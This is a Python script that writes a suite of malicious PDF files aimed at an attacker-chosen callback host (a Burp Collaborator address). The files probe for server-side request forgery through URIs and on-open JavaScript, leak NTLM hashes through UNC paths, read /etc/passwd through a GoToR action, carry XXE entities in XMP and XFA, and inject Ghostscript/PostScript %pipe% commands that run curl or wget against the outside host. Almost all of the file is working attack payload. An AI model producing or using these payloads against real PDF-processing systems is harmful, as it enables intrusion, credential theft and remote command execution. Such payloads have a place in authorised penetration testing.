from pathlib import Path

def generate_pdf_payloads(output_dir, burp_collab):
    output_dir = Path(output_dir)
    output_dir.mkdir(parents=True, exist_ok=True)
    
    base_url = f"http://{burp_collab}"
    
    vulns = {
        'ssrf': [],
        'ntlm': [],
        'lfi': [],
        'xxe': [],
        'rce': [],
    }
    
    ssrf_dir = output_dir / 'ssrf'
    ssrf_dir.mkdir(exist_ok=True)
    ntlm_dir = output_dir / 'ntlm'
    ntlm_dir.mkdir(exist_ok=True)
    lfi_dir = output_dir / 'lfi'
    lfi_dir.mkdir(exist_ok=True)
    xxe_dir = output_dir / 'xxe'
    xxe_dir.mkdir(exist_ok=True)
    rce_dir = output_dir / 'rce'
    rce_dir.mkdir(exist_ok=True)
    
    pdf_header = b'%PDF-1.4\n'
    pdf_trailer = b'\n%%EOF'
    
    pdf_ssrf1_xobject_image = f'''%PDF-1.4
1 0 obj
<<
/Type /Catalog
/Pages 2 0 R
>>
endobj
2 0 obj
<<
/Type /Pages
/Kids [3 0 R]
/Count 1
>>
endobj
3 0 obj
<<
/Type /Page
/Parent 2 0 R
/MediaBox [0 0 612 792]
/Resources <<
/XObject <<
/Img1 4 0 R
>>
>>
/Contents 5 0 R
>>
endobj
4 0 obj
<<
/Type /XObject
/Subtype /Image
/Width 100
/Height 100
/ColorSpace /DeviceRGB
/BitsPerComponent 8
/URI ({base_url}/img1)
>>
stream
endstream
endobj
5 0 obj
<<
/Length 0
>>
stream
endstream
endobj
xref
0 6
trailer
<<
/Size 6
/Root 1 0 R
>>
startxref
0
%%EOF'''
    with open(ssrf_dir / "ssrf1_xobject_image.pdf", 'wb') as f:
        f.write(pdf_ssrf1_xobject_image.encode())
    
    pdf_ssrf2_fontfile = f'''%PDF-1.4
1 0 obj
<<
/Type /Catalog
/Pages 2 0 R
>>
endobj
2 0 obj
<<
/Type /Pages
/Kids [3 0 R]
/Count 1
>>
endobj
3 0 obj
<<
/Type /Page
/Parent 2 0 R
/MediaBox [0 0 612 792]
/Resources <<
/Font <<
/F1 4 0 R
>>
>>
/Contents 5 0 R
>>
endobj
4 0 obj
<<
/Type /Font
/Subtype /Type1
/BaseFont /Helvetica
/FontFile2 <<
/URI ({base_url}/font.ttf)
>>
>>
endobj
5 0 obj
<<
/Length 0
>>
stream
endstream
endobj
xref
0 6
trailer
<<
/Size 6
/Root 1 0 R
>>
startxref
0
%%EOF'''
    with open(ssrf_dir / "ssrf2_fontfile.pdf", 'wb') as f:
        f.write(pdf_ssrf2_fontfile.encode())
    
    pdf_ssrf3_annot_uri = f'''%PDF-1.4
1 0 obj
<<
/Type /Catalog
/Pages 2 0 R
>>
endobj
2 0 obj
<<
/Type /Pages
/Kids [3 0 R]
/Count 1
>>
endobj
3 0 obj
<<
/Type /Page
/Parent 2 0 R
/MediaBox [0 0 612 792]
/Annots [4 0 R]
>>
endobj
4 0 obj
<<
/Type /Annot
/Subtype /Link
/Rect [100 100 200 200]
/A <<
/S /URI
/URI ({base_url}/link1)
>>
>>
endobj
xref
0 5
trailer
<<
/Size 5
/Root 1 0 R
>>
startxref
0
%%EOF'''
    with open(ssrf_dir / "ssrf3_annot_uri.pdf", 'wb') as f:
        f.write(pdf_ssrf3_annot_uri.encode())
    
    pdf_ssrf4_gotor = f'''%PDF-1.4
1 0 obj
<<
/Type /Catalog
/Pages 2 0 R
/OpenAction 3 0 R
>>
endobj
2 0 obj
<<
/Type /Pages
/Kids [4 0 R]
/Count 1
>>
endobj
3 0 obj
<<
/Type /Action
/S /GoToR
/F ({base_url}/remote.pdf)
/D [0 /Fit]
>>
endobj
4 0 obj
<<
/Type /Page
/Parent 2 0 R
/MediaBox [0 0 612 792]
>>
endobj
xref
0 5
trailer
<<
/Size 5
/Root 1 0 R
>>
startxref
0
%%EOF'''
    with open(ssrf_dir / "ssrf4_gotor.pdf", 'wb') as f:
        f.write(pdf_ssrf4_gotor.encode())
    
    pdf_ssrf5_xmp = f'''%PDF-1.4
1 0 obj
<<
/Type /Catalog
/Pages 2 0 R
/Metadata 3 0 R
>>
endobj
2 0 obj
<<
/Type /Pages
/Kids [4 0 R]
/Count 1
>>
endobj
3 0 obj
<<
/Type /Metadata
/Subtype /XML
/Length 200
>>
stream
<?xpacket begin="\ufeff" id="W5M0MpCehiHzreSzNTczkc9d"?>
<x:xmpmeta xmlns:x="adobe:ns:meta/">
<rdf:RDF xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#">
<rdf:Description rdf:about="" xmlns:xmpMM="http://ns.adobe.com/xap/1.0/mm/">
<xmpMM:DocumentID>{base_url}/xmp</xmpMM:DocumentID>
</rdf:Description>
</rdf:RDF>
</x:xmpmeta>
<?xpacket end="w"?>
endstream
endobj
4 0 obj
<<
/Type /Page
/Parent 2 0 R
/MediaBox [0 0 612 792]
>>
endobj
xref
0 5
trailer
<<
/Size 5
/Root 1 0 R
>>
startxref
0
%%EOF'''
    with open(ssrf_dir / "ssrf5_xmp.pdf", 'wb') as f:
        f.write(pdf_ssrf5_xmp.encode())
    
    pdf_ssrf6_icc = f'''%PDF-1.4
1 0 obj
<<
/Type /Catalog
/Pages 2 0 R
>>
endobj
2 0 obj
<<
/Type /Pages
/Kids [3 0 R]
/Count 1
>>
endobj
3 0 obj
<<
/Type /Page
/Parent 2 0 R
/MediaBox [0 0 612 792]
/Resources <<
/ColorSpace <<
/CS1 4 0 R
>>
>>
>>
endobj
4 0 obj
<<
/N 3
/Alternate /DeviceRGB
/Filter /FlateDecode
/Length 0
/URI ({base_url}/evil.icc)
>>
endobj
xref
0 5
trailer
<<
/Size 5
/Root 1 0 R
>>
startxref
0
%%EOF'''
    with open(ssrf_dir / "ssrf6_icc.pdf", 'wb') as f:
        f.write(pdf_ssrf6_icc.encode())
    
    pdf_ssrf7_embedded = f'''%PDF-1.4
1 0 obj
<<
/Type /Catalog
/Pages 2 0 R
/Names <<
/EmbeddedFiles <<
/Names [(evil.zip) 3 0 R]
>>
>>
>>
endobj
2 0 obj
<<
/Type /Pages
/Kids [4 0 R]
/Count 1
>>
endobj
3 0 obj
<<
/Type /FileSpec
/F (evil.zip)
/EF <<
/F 5 0 R
>>
>>
endobj
4 0 obj
<<
/Type /Page
/Parent 2 0 R
/MediaBox [0 0 612 792]
>>
endobj
5 0 obj
<<
/Type /EmbeddedFile
/Length 0
/F <<
/URI ({base_url}/evil.zip)
>>
>>
endobj
xref
0 6
trailer
<<
/Size 6
/Root 1 0 R
>>
startxref
0
%%EOF'''
    with open(ssrf_dir / "ssrf7_embedded.pdf", 'wb') as f:
        f.write(pdf_ssrf7_embedded.encode())
    
    pdf_ssrf8_xfa = f'''%PDF-1.4
1 0 obj
<<
/Type /Catalog
/Pages 2 0 R
/AcroForm <<
/XFA 3 0 R
>>
>>
endobj
2 0 obj
<<
/Type /Pages
/Kids [4 0 R]
/Count 1
>>
endobj
3 0 obj
<<
/Length 200
>>
stream
<?xml version="1.0"?>
<xdp:xdp xmlns:xdp="http://ns.adobe.com/xdp/">
<template>
<image href="{base_url}/xfa-img"/>
</template>
</xdp:xdp>
endstream
endobj
4 0 obj
<<
/Type /Page
/Parent 2 0 R
/MediaBox [0 0 612 792]
>>
endobj
xref
0 5
trailer
<<
/Size 5
/Root 1 0 R
>>
startxref
0
%%EOF'''
    with open(ssrf_dir / "ssrf8_xfa.pdf", 'wb') as f:
        f.write(pdf_ssrf8_xfa.encode())
    
    pdf_ssrf9_js_import = f'''%PDF-1.4
1 0 obj
<<
/Type /Catalog
/Pages 2 0 R
/Names <<
/JavaScript <<
/Names [(test) 3 0 R]
>>
>>
>>
endobj
2 0 obj
<<
/Type /Pages
/Kids [4 0 R]
/Count 1
>>
endobj
3 0 obj
<<
/S /JavaScript
/JS (this.importDataObject("pwn","{base_url}/file");)
>>
endobj
4 0 obj
<<
/Type /Page
/Parent 2 0 R
/MediaBox [0 0 612 792]
>>
endobj
xref
0 5
trailer
<<
/Size 5
/Root 1 0 R
>>
startxref
0
%%EOF'''
    with open(ssrf_dir / "ssrf9_js_import.pdf", 'wb') as f:
        f.write(pdf_ssrf9_js_import.encode())
    
    pdf_ssrf10_launch = f'''%PDF-1.4
1 0 obj
<<
/Type /Catalog
/Pages 2 0 R
>>
endobj
2 0 obj
<<
/Type /Pages
/Kids [3 0 R]
/Count 1
>>
endobj
3 0 obj
<<
/Type /Page
/Parent 2 0 R
/MediaBox [0 0 612 792]
/Annots [4 0 R]
>>
endobj
4 0 obj
<<
/Type /Annot
/Subtype /Link
/Rect [100 100 200 200]
/A <<
/S /Launch
/F <<
/URI ({base_url}/evil.exe)
>>
>>
>>
endobj
xref
0 5
trailer
<<
/Size 5
/Root 1 0 R
>>
startxref
0
%%EOF'''
    with open(ssrf_dir / "ssrf10_launch.pdf", 'wb') as f:
        f.write(pdf_ssrf10_launch.encode())
    
    pdf_ssrf11_iframe = f'''%PDF-1.4
1 0 obj
<<
/Type /Catalog
/Pages 2 0 R
/OpenAction <<
/S /JavaScript
/JS (app.alert("Loading iframe"); var html = '<iframe src="{base_url}/iframe"></iframe>'; this.getField("test").value = html;)
>>
>>
endobj
2 0 obj
<<
/Type /Pages
/Kids [3 0 R]
/Count 1
>>
endobj
3 0 obj
<<
/Type /Page
/Parent 2 0 R
/MediaBox [0 0 612 792]
>>
endobj
xref
0 4
trailer
<<
/Size 4
/Root 1 0 R
>>
startxref
0
%%EOF'''
    with open(ssrf_dir / "ssrf11_iframe.pdf", 'wb') as f:
        f.write(pdf_ssrf11_iframe.encode())
    
    pdf_ssrf12_xhr = f'''%PDF-1.4
1 0 obj
<<
/Type /Catalog
/Pages 2 0 R
/OpenAction <<
/S /JavaScript
/JS (var x=new XMLHttpRequest();x.onload=(()=>app.alert(this.responseText));x.open('GET','{base_url}/xhr');x.send();)
>>
>>
endobj
2 0 obj
<<
/Type /Pages
/Kids [3 0 R]
/Count 1
>>
endobj
3 0 obj
<<
/Type /Page
/Parent 2 0 R
/MediaBox [0 0 612 792]
>>
endobj
xref
0 4
trailer
<<
/Size 4
/Root 1 0 R
>>
startxref
0
%%EOF'''
    with open(ssrf_dir / "ssrf12_xhr.pdf", 'wb') as f:
        f.write(pdf_ssrf12_xhr.encode())
    
    pdf_ssrf13_fetch = f'''%PDF-1.4
1 0 obj
<<
/Type /Catalog
/Pages 2 0 R
/OpenAction <<
/S /JavaScript
/JS (fetch('{base_url}/fetch').then(async r=>app.alert(await r.text()));)
>>
>>
endobj
2 0 obj
<<
/Type /Pages
/Kids [3 0 R]
/Count 1
>>
endobj
3 0 obj
<<
/Type /Page
/Parent 2 0 R
/MediaBox [0 0 612 792]
>>
endobj
xref
0 4
trailer
<<
/Size 4
/Root 1 0 R
>>
startxref
0
%%EOF'''
    with open(ssrf_dir / "ssrf13_fetch.pdf", 'wb') as f:
        f.write(pdf_ssrf13_fetch.encode())
    
    pdf_ssrf14_embed = f'''%PDF-1.4
1 0 obj
<<
/Type /Catalog
/Pages 2 0 R
/OpenAction <<
/S /JavaScript
/JS (app.alert("Loading embed"); var html = '<embed src="{base_url}/embed" />'; this.getField("test").value = html;)
>>
>>
endobj
2 0 obj
<<
/Type /Pages
/Kids [3 0 R]
/Count 1
>>
endobj
3 0 obj
<<
/Type /Page
/Parent 2 0 R
/MediaBox [0 0 612 792]
>>
endobj
xref
0 4
trailer
<<
/Size 4
/Root 1 0 R
>>
startxref
0
%%EOF'''
    with open(ssrf_dir / "ssrf14_embed.pdf", 'wb') as f:
        f.write(pdf_ssrf14_embed.encode())
    
    pdf_ssrf15_base = f'''%PDF-1.4
1 0 obj
<<
/Type /Catalog
/Pages 2 0 R
/OpenAction <<
/S /JavaScript
/JS (app.alert("Loading base"); var html = '<base href="{base_url}/base" />'; this.getField("test").value = html;)
>>
>>
endobj
2 0 obj
<<
/Type /Pages
/Kids [3 0 R]
/Count 1
>>
endobj
3 0 obj
<<
/Type /Page
/Parent 2 0 R
/MediaBox [0 0 612 792]
>>
endobj
xref
0 4
trailer
<<
/Size 4
/Root 1 0 R
>>
startxref
0
%%EOF'''
    with open(ssrf_dir / "ssrf15_base.pdf", 'wb') as f:
        f.write(pdf_ssrf15_base.encode())
    
    pdf_ssrf16_link = f'''%PDF-1.4
1 0 obj
<<
/Type /Catalog
/Pages 2 0 R
/OpenAction <<
/S /JavaScript
/JS (app.alert("Loading link"); var html = '<link rel="stylesheet" src="{base_url}/link" />'; this.getField("test").value = html;)
>>
>>
endobj
2 0 obj
<<
/Type /Pages
/Kids [3 0 R]
/Count 1
>>
endobj
3 0 obj
<<
/Type /Page
/Parent 2 0 R
/MediaBox [0 0 612 792]
>>
endobj
xref
0 4
trailer
<<
/Size 4
/Root 1 0 R
>>
startxref
0
%%EOF'''
    with open(ssrf_dir / "ssrf16_link.pdf", 'wb') as f:
        f.write(pdf_ssrf16_link.encode())
    
    pdf_ssrf17_script = f'''%PDF-1.4
1 0 obj
<<
/Type /Catalog
/Pages 2 0 R
/OpenAction <<
/S /JavaScript
/JS (app.alert("Loading script"); var html = '<script src="{base_url}/script"></script>'; this.getField("test").value = html;)
>>
>>
endobj
2 0 obj
<<
/Type /Pages
/Kids [3 0 R]
/Count 1
>>
endobj
3 0 obj
<<
/Type /Page
/Parent 2 0 R
/MediaBox [0 0 612 792]
>>
endobj
xref
0 4
trailer
<<
/Size 4
/Root 1 0 R
>>
startxref
0
%%EOF'''
    with open(ssrf_dir / "ssrf17_script.pdf", 'wb') as f:
        f.write(pdf_ssrf17_script.encode())
    
    pdf_ssrf18_meta = f'''%PDF-1.4
1 0 obj
<<
/Type /Catalog
/Pages 2 0 R
/OpenAction <<
/S /JavaScript
/JS (app.alert("Loading meta"); var html = '<meta http-equiv="refresh" content="0; url={base_url}/meta/" />'; this.getField("test").value = html;)
>>
>>
endobj
2 0 obj
<<
/Type /Pages
/Kids [3 0 R]
/Count 1
>>
endobj
3 0 obj
<<
/Type /Page
/Parent 2 0 R
/MediaBox [0 0 612 792]
>>
endobj
xref
0 4
trailer
<<
/Size 4
/Root 1 0 R
>>
startxref
0
%%EOF'''
    with open(ssrf_dir / "ssrf18_meta.pdf", 'wb') as f:
        f.write(pdf_ssrf18_meta.encode())
    
    pdf_ssrf19_img = f'''%PDF-1.4
1 0 obj
<<
/Type /Catalog
/Pages 2 0 R
/OpenAction <<
/S /JavaScript
/JS (app.alert("Loading img"); var html = '<img src="{base_url}/img" />'; this.getField("test").value = html;)
>>
>>
endobj
2 0 obj
<<
/Type /Pages
/Kids [3 0 R]
/Count 1
>>
endobj
3 0 obj
<<
/Type /Page
/Parent 2 0 R
/MediaBox [0 0 612 792]
>>
endobj
xref
0 4
trailer
<<
/Size 4
/Root 1 0 R
>>
startxref
0
%%EOF'''
    with open(ssrf_dir / "ssrf19_img.pdf", 'wb') as f:
        f.write(pdf_ssrf19_img.encode())
    
    pdf_ssrf20_svg = f'''%PDF-1.4
1 0 obj
<<
/Type /Catalog
/Pages 2 0 R
/OpenAction <<
/S /JavaScript
/JS (app.alert("Loading svg"); var html = '<svg src="{base_url}/svg" />'; this.getField("test").value = html;)
>>
>>
endobj
2 0 obj
<<
/Type /Pages
/Kids [3 0 R]
/Count 1
>>
endobj
3 0 obj
<<
/Type /Page
/Parent 2 0 R
/MediaBox [0 0 612 792]
>>
endobj
xref
0 4
trailer
<<
/Size 4
/Root 1 0 R
>>
startxref
0
%%EOF'''
    with open(ssrf_dir / "ssrf20_svg.pdf", 'wb') as f:
        f.write(pdf_ssrf20_svg.encode())
    
    pdf_ssrf21_input = f'''%PDF-1.4
1 0 obj
<<
/Type /Catalog
/Pages 2 0 R
/OpenAction <<
/S /JavaScript
/JS (app.alert("Loading input"); var html = '<input type="image" src="{base_url}/input" />'; this.getField("test").value = html;)
>>
>>
endobj
2 0 obj
<<
/Type /Pages
/Kids [3 0 R]
/Count 1
>>
endobj
3 0 obj
<<
/Type /Page
/Parent 2 0 R
/MediaBox [0 0 612 792]
>>
endobj
xref
0 4
trailer
<<
/Size 4
/Root 1 0 R
>>
startxref
0
%%EOF'''
    with open(ssrf_dir / "ssrf21_input.pdf", 'wb') as f:
        f.write(pdf_ssrf21_input.encode())
    
    pdf_ssrf22_video = f'''%PDF-1.4
1 0 obj
<<
/Type /Catalog
/Pages 2 0 R
/OpenAction <<
/S /JavaScript
/JS (app.alert("Loading video"); var html = '<video src="{base_url}/video" />'; this.getField("test").value = html;)
>>
>>
endobj
2 0 obj
<<
/Type /Pages
/Kids [3 0 R]
/Count 1
>>
endobj
3 0 obj
<<
/Type /Page
/Parent 2 0 R
/MediaBox [0 0 612 792]
>>
endobj
xref
0 4
trailer
<<
/Size 4
/Root 1 0 R
>>
startxref
0
%%EOF'''
    with open(ssrf_dir / "ssrf22_video.pdf", 'wb') as f:
        f.write(pdf_ssrf22_video.encode())
    
    pdf_ssrf23_audio = f'''%PDF-1.4
1 0 obj
<<
/Type /Catalog
/Pages 2 0 R
/OpenAction <<
/S /JavaScript
/JS (app.alert("Loading audio"); var html = '<audio src="{base_url}/audio" />'; this.getField("test").value = html;)
>>
>>
endobj
2 0 obj
<<
/Type /Pages
/Kids [3 0 R]
/Count 1
>>
endobj
3 0 obj
<<
/Type /Page
/Parent 2 0 R
/MediaBox [0 0 612 792]
>>
endobj
xref
0 4
trailer
<<
/Size 4
/Root 1 0 R
>>
startxref
0
%%EOF'''
    with open(ssrf_dir / "ssrf23_audio.pdf", 'wb') as f:
        f.write(pdf_ssrf23_audio.encode())
    
    pdf_ssrf24_audio_source = f'''%PDF-1.4
1 0 obj
<<
/Type /Catalog
/Pages 2 0 R
/OpenAction <<
/S /JavaScript
/JS (app.alert("Loading audio source"); var html = '<audio><source src="{base_url}/audio-source"/></audio>'; this.getField("test").value = html;)
>>
>>
endobj
2 0 obj
<<
/Type /Pages
/Kids [3 0 R]
/Count 1
>>
endobj
3 0 obj
<<
/Type /Page
/Parent 2 0 R
/MediaBox [0 0 612 792]
>>
endobj
xref
0 4
trailer
<<
/Size 4
/Root 1 0 R
>>
startxref
0
%%EOF'''
    with open(ssrf_dir / "ssrf24_audio_source.pdf", 'wb') as f:
        f.write(pdf_ssrf24_audio_source.encode())
    
    pdf_ntlm11_xobject_unc = f'''%PDF-1.4
1 0 obj
<<
/Type /Catalog
/Pages 2 0 R
>>
endobj
2 0 obj
<<
/Type /Pages
/Kids [3 0 R]
/Count 1
>>
endobj
3 0 obj
<<
/Type /Page
/Parent 2 0 R
/MediaBox [0 0 612 792]
/Resources <<
/XObject <<
/Img1 4 0 R
>>
>>
/Contents 5 0 R
>>
endobj
4 0 obj
<<
/Type /XObject
/Subtype /Image
/Width 100
/Height 100
/ColorSpace /DeviceRGB
/BitsPerComponent 8
/URI (\\\\{burp_collab}\\pwn.png)
>>
stream
endstream
endobj
5 0 obj
<<
/Length 0
>>
stream
endstream
endobj
xref
0 6
trailer
<<
/Size 6
/Root 1 0 R
>>
startxref
0
%%EOF'''
    with open(ntlm_dir / "ntlm11_xobject_unc.pdf", 'wb') as f:
        f.write(pdf_ntlm11_xobject_unc.encode())
    
    pdf_ntlm12_font_unc = f'''%PDF-1.4
1 0 obj
<<
/Type /Catalog
/Pages 2 0 R
>>
endobj
2 0 obj
<<
/Type /Pages
/Kids [3 0 R]
/Count 1
>>
endobj
3 0 obj
<<
/Type /Page
/Parent 2 0 R
/MediaBox [0 0 612 792]
/Resources <<
/Font <<
/F1 4 0 R
>>
>>
/Contents 5 0 R
>>
endobj
4 0 obj
<<
/Type /Font
/Subtype /Type1
/BaseFont /Helvetica
/FontFile2 <<
/URI (\\\\{burp_collab}\\font.ttf)
>>
>>
endobj
5 0 obj
<<
/Length 0
>>
stream
endstream
endobj
xref
0 6
trailer
<<
/Size 6
/Root 1 0 R
>>
startxref
0
%%EOF'''
    with open(ntlm_dir / "ntlm12_font_unc.pdf", 'wb') as f:
        f.write(pdf_ntlm12_font_unc.encode())
    
    pdf_lfi13_gotor_file = f'''%PDF-1.4
1 0 obj
<<
/Type /Catalog
/Pages 2 0 R
/OpenAction 3 0 R
>>
endobj
2 0 obj
<<
/Type /Pages
/Kids [4 0 R]
/Count 1
>>
endobj
3 0 obj
<<
/Type /Action
/S /GoToR
/F (file:///etc/passwd)
/D [0 /Fit]
>>
endobj
4 0 obj
<<
/Type /Page
/Parent 2 0 R
/MediaBox [0 0 612 792]
>>
endobj
xref
0 5
trailer
<<
/Size 5
/Root 1 0 R
>>
startxref
0
%%EOF'''
    with open(lfi_dir / "lfi13_gotor_file.pdf", 'wb') as f:
        f.write(pdf_lfi13_gotor_file.encode())
    
    pdf_xxe14_xmp = f'''%PDF-1.4
1 0 obj
<<
/Type /Catalog
/Pages 2 0 R
/Metadata 3 0 R
>>
endobj
2 0 obj
<<
/Type /Pages
/Kids [4 0 R]
/Count 1
>>
endobj
3 0 obj
<<
/Type /Metadata
/Subtype /XML
/Length 300
>>
stream
<?xpacket begin="\ufeff" id="W5M0MpCehiHzreSzNTczkc9d"?>
<!DOCTYPE x [<!ENTITY % x SYSTEM "{base_url}/xxe-xmp">%x;]>
<x:xmpmeta xmlns:x="adobe:ns:meta/">
<rdf:RDF xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#">
<rdf:Description rdf:about="" xmlns:xmp="http://ns.adobe.com/xap/1.0/">
<xmp:CreatorTool>Test</xmp:CreatorTool>
</rdf:Description>
</rdf:RDF>
</x:xmpmeta>
<?xpacket end="w"?>
endstream
endobj
4 0 obj
<<
/Type /Page
/Parent 2 0 R
/MediaBox [0 0 612 792]
>>
endobj
xref
0 5
trailer
<<
/Size 5
/Root 1 0 R
>>
startxref
0
%%EOF'''
    with open(xxe_dir / "xxe14_xmp.pdf", 'wb') as f:
        f.write(pdf_xxe14_xmp.encode())
    
    pdf_xxe15_xfa = f'''%PDF-1.4
1 0 obj
<<
/Type /Catalog
/Pages 2 0 R
/AcroForm <<
/XFA 3 0 R
>>
>>
endobj
2 0 obj
<<
/Type /Pages
/Kids [4 0 R]
/Count 1
>>
endobj
3 0 obj
<<
/Length 300
>>
stream
<?xml version="1.0"?>
<!DOCTYPE x [<!ENTITY % x SYSTEM "{base_url}/xfa-xxe">%x;]>
<xdp:xdp xmlns:xdp="http://ns.adobe.com/xdp/">
<template>
<field name="test">Test</field>
</template>
</xdp:xdp>
endstream
endobj
4 0 obj
<<
/Type /Page
/Parent 2 0 R
/MediaBox [0 0 612 792]
>>
endobj
xref
0 5
trailer
<<
/Size 5
/Root 1 0 R
>>
startxref
0
%%EOF'''
    with open(xxe_dir / "xxe15_xfa.pdf", 'wb') as f:
        f.write(pdf_xxe15_xfa.encode())
    
    pdf_rce1_ghostscript = f'''%PDF-1.4
1 0 obj
<<
/Type /Catalog
/Pages 2 0 R
>>
endobj
2 0 obj
<<
/Type /Pages
/Kids [3 0 R]
/Count 1
>>
endobj
3 0 obj
<<
/Type /Page
/Parent 2 0 R
/MediaBox [0 0 612 792]
/Contents 4 0 R
>>
endobj
4 0 obj
<<
/Length 200
/Filter /FlateDecode
>>
stream
%!PS-Adobe-3.0
userdict /setpagedevice undef
save
legal
{{
    null restore
    stopped {{
        pop
    }} if
    (legal)
}} stopped
{{
    (legal\\) {{
        pop
        legal
    }} stopped
    {{
        restore
    }} ifelse
}} ifelse
mark /OutputFile (%pipe%curl {base_url}/rce-ghostscript) currentdevice putdeviceprops
endstream
endobj
xref
0 5
trailer
<<
/Size 5
/Root 1 0 R
>>
startxref
0
%%EOF'''
    with open(rce_dir / "rce1_ghostscript.pdf", 'wb') as f:
        f.write(pdf_rce1_ghostscript.encode())
    
    pdf_rce2_postscript = f'''%PDF-1.4
1 0 obj
<<
/Type /Catalog
/Pages 2 0 R
>>
endobj
2 0 obj
<<
/Type /Pages
/Kids [3 0 R]
/Count 1
>>
endobj
3 0 obj
<<
/Type /Page
/Parent 2 0 R
/MediaBox [0 0 612 792]
/Contents 4 0 R
>>
endobj
4 0 obj
<<
/Length 150
/Filter /FlateDecode
>>
stream
%!PS-Adobe-3.0
/OutputFile (%pipe%wget {base_url}/rce-postscript) (w) file
endstream
endobj
xref
0 5
trailer
<<
/Size 5
/Root 1 0 R
>>
startxref
0
%%EOF'''
    with open(rce_dir / "rce2_postscript.pdf", 'wb') as f:
        f.write(pdf_rce2_postscript.encode())
    
    pdf_master = f'''%PDF-1.4
1 0 obj
<<
/Type /Catalog
/Pages 2 0 R
/Metadata 3 0 R
/OpenAction <<
/S /JavaScript
/JS (var x=new XMLHttpRequest();x.onload=(()=>app.alert(this.responseText));x.open('GET','{base_url}/xhr');x.send();fetch('{base_url}/fetch').then(async r=>app.alert(await r.text()));)
>>
/Names <<
/JavaScript <<
/Names [(test) 6 0 R (iframe) 15 0 R (xhr) 16 0 R (fetch) 17 0 R]
>>
/EmbeddedFiles <<
/Names [(evil.zip) 7 0 R]
>>
>>
/AcroForm <<
/XFA 8 0 R
>>
>>
endobj
2 0 obj
<<
/Type /Pages
/Kids [9 0 R]
/Count 1
>>
endobj
3 0 obj
<<
/Type /Metadata
/Subtype /XML
/Length 400
>>
stream
<?xpacket begin="\ufeff" id="W5M0MpCehiHzreSzNTczkc9d"?>
<!DOCTYPE x [<!ENTITY % x SYSTEM "{base_url}/xxe-xmp">%x;]>
<x:xmpmeta xmlns:x="adobe:ns:meta/">
<rdf:RDF xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#">
<rdf:Description rdf:about="" xmlns:xmpMM="http://ns.adobe.com/xap/1.0/mm/">
<xmpMM:DocumentID>{base_url}/xmp</xmpMM:DocumentID>
</rdf:Description>
</rdf:RDF>
</x:xmpmeta>
<?xpacket end="w"?>
endstream
endobj
4 0 obj
<<
/Type /XObject
/Subtype /Image
/Width 100
/Height 100
/ColorSpace /DeviceRGB
/BitsPerComponent 8
/URI ({base_url}/img1)
>>
stream
endstream
endobj
5 0 obj
<<
/Type /Font
/Subtype /Type1
/BaseFont /Helvetica
/FontFile2 <<
/URI ({base_url}/font.ttf)
>>
>>
endobj
6 0 obj
<<
/S /JavaScript
/JS (this.importDataObject("pwn","{base_url}/file");)
>>
endobj
7 0 obj
<<
/Type /FileSpec
/F (evil.zip)
/EF <<
/F 10 0 R
>>
>>
endobj
8 0 obj
<<
/Length 300
>>
stream
<?xml version="1.0"?>
<!DOCTYPE x [<!ENTITY % x SYSTEM "{base_url}/xfa-xxe">%x;]>
<xdp:xdp xmlns:xdp="http://ns.adobe.com/xdp/">
<template>
<image href="{base_url}/xfa-img"/>
<field name="test">Test</field>
</template>
</xdp:xdp>
endstream
endobj
9 0 obj
<<
/Type /Page
/Parent 2 0 R
/MediaBox [0 0 612 792]
/Resources <<
/XObject <<
/Img1 4 0 R
>>
/Font <<
/F1 5 0 R
>>
/ColorSpace <<
/CS1 11 0 R
>>
>>
/Annots [12 0 R 13 0 R]
/Contents 14 0 R
>>
endobj
10 0 obj
<<
/Type /EmbeddedFile
/Length 0
/F <<
/URI ({base_url}/evil.zip)
>>
>>
endobj
11 0 obj
<<
/N 3
/Alternate /DeviceRGB
/Filter /FlateDecode
/Length 0
/URI ({base_url}/evil.icc)
>>
endobj
12 0 obj
<<
/Type /Annot
/Subtype /Link
/Rect [100 100 200 200]
/A <<
/S /URI
/URI ({base_url}/link1)
>>
>>
endobj
13 0 obj
<<
/Type /Annot
/Subtype /Link
/Rect [300 300 400 400]
/A <<
/S /GoToR
/F ({base_url}/remote.pdf)
/D [0 /Fit]
>>
>>
endobj
14 0 obj
<<
/Length 0
>>
stream
endstream
endobj
15 0 obj
<<
/S /JavaScript
/JS (app.alert("Loading iframe"); var html = '<iframe src="{base_url}/iframe"></iframe>'; this.getField("test").value = html;)
>>
endobj
16 0 obj
<<
/S /JavaScript
/JS (var x=new XMLHttpRequest();x.onload=(()=>app.alert(this.responseText));x.open('GET','{base_url}/xhr');x.send();)
>>
endobj
17 0 obj
<<
/S /JavaScript
/JS (fetch('{base_url}/fetch').then(async r=>app.alert(await r.text()));)
>>
endobj
xref
0 18
trailer
<<
/Size 18
/Root 1 0 R
>>
startxref
0
%%EOF'''
    with open(output_dir / "master.pdf", 'wb') as f:
        f.write(pdf_master.encode())
    
    pdf_master2_rce = f'''%PDF-1.4
1 0 obj
<<
/Type /Catalog
/Pages 2 0 R
>>
endobj
2 0 obj
<<
/Type /Pages
/Kids [3 0 R]
/Count 1
>>
endobj
3 0 obj
<<
/Type /Page
/Parent 2 0 R
/MediaBox [0 0 612 792]
/Contents 4 0 R
>>
endobj
4 0 obj
<<
/Length 300
/Filter /FlateDecode
>>
stream
%!PS-Adobe-3.0
userdict /setpagedevice undef
save
legal
{{
    null restore
    stopped {{
        pop
    }} if
    (legal)
}} stopped
{{
    (legal\\) {{
        pop
        legal
    }} stopped
    {{
        restore
    }} ifelse
}} ifelse
mark /OutputFile (%pipe%curl {base_url}/rce-ghostscript) currentdevice putdeviceprops
mark /OutputFile (%pipe%wget {base_url}/rce-postscript) currentdevice putdeviceprops
endstream
endobj
xref
0 5
trailer
<<
/Size 5
/Root 1 0 R
>>
startxref
0
%%EOF'''
    with open(output_dir / "master2_rce.pdf", 'wb') as f:
        f.write(pdf_master2_rce.encode())
